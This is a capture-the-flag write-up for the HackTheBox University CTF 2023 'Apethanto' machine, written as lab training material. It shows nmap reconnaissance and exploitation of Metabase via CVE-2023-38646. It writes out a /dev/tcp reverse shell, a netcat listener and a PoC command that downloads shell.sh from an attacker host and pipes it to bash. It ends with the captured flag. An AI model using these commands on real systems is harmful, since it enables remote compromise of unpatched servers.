# Description

Apethanto

### PS

While making this, the server is already down so I will just explain every detailed for this challenges

## Machine
First lets connect to vpn. Download the VPN file of University  CTF 2023 and use `sudo openvpn VPN_FILE_Location`

![384562872_334647755980270_6305945319847782979_n](https://github.com/MyBoss214/HackTheBox/assets/149683905/d63d5954-ed11-4c28-93d4-170154518000)

Then go back to website of HTBCTF then go to `fullpwn` category and click `easy` then `deploy the machine`
after deploying the machine we will get the `Machine_IP_Address` for this challenge

# RECONNAISANCE

First is to gather information about this IP address of machine.
```
nmap -sS -sC -sV machine_IP_address
```

open ports `80`, `22`and `3000`

  - in port 3000 we will see the Jetty 11.0.14 and metabase

  - Through researching we see that the version is exploitable with `CVE-2023-38646`

  - use this [https://github.com/shamo0/CVE-2023-38646-PoC/blob/main/README.md](https://github.com/shamo0/CVE-2023-38646-PoC/blob/main/README.md) for exploit

    
# Exploitation

first got use `sudo nano /etc/hosts` to add hosts. replace IP_Address with `Machine_IP_Address`
![395243388_1387672582178772_352194472341723714_n](https://github.com/MyBoss214/HackTheBox/assets/149683905/c0612c9d-0d3f-4af6-a211-5ec6d6da618c)

Go to `http://metabase.apethanto.htb/api/session/properties` to get setup-token just like this in shamo0 github

![image](https://github.com/MyBoss214/HackTheBox/assets/149683905/529fa3b1-daa6-405f-89e7-2a54d35ad73b)

Create a shell.sh file containing a command script `sh -i >& /dev/tcp/attacker_IP/port 0>&1` replace attacker_ip with your `ip address` and port with your `server_port`

![385546818_200420423125664_8244732543944960905_n](https://github.com/MyBoss214/HackTheBox/assets/149683905/e0d7d336-4bfe-4b7b-866c-0d6b7136c0cc)

then in the same directory in shell.sh file run `python3 -m http.server server_port` to start a server. go to that server and you can see the shell.sh
![image](https://github.com/MyBoss214/HackTheBox/assets/149683905/43fd15f3-b06a-4ec7-b490-1f3b6b024936)

# Reverse shell
first start a server containing the shell.sh

![image](https://github.com/MyBoss214/HackTheBox/assets/149683905/9a0036ee-18e9-4130-9387-a41357c9fa42)

then use `nc -lvnp 4444` for listener. You can use any port

![image](https://github.com/MyBoss214/HackTheBox/assets/149683905/ea0d647f-1575-4cd8-9266-6fe69710b976)

Then use this command 
```
python3 CVE-2023-38646.py -u http://metabase.apethanto.htb -t SETUP-TOKEN -c "-X GET http://ATTACKER_IP_ADDRESS:8000/shell.sh | bash"
```
 make sure you are in CVE-2023-38646.py directory
- Replace `SETUP-TOKEN` with token we generate in `http://metabase.apethanto.htb/api/session/properties`
- Replace `ATTACKER_IP_ADDRESS with` Your IP Address
- you can use any port. In my case I use 8000

![Untitled](https://github.com/MyBoss214/HackTheBox/assets/149683905/460505c4-e976-48ed-8400-d90d3659dafb)

### Go back to your listener and you will get

![image](https://github.com/MyBoss214/HackTheBox/assets/149683905/19bfa7e8-aa26-4940-a182-19cc2e42ea4d)

And you are IN!

use `ls` to see the file in current directory and `cat file.txt` of the file name

`HTB{3d1d071e4a99135770f57b53ec1644d2}`
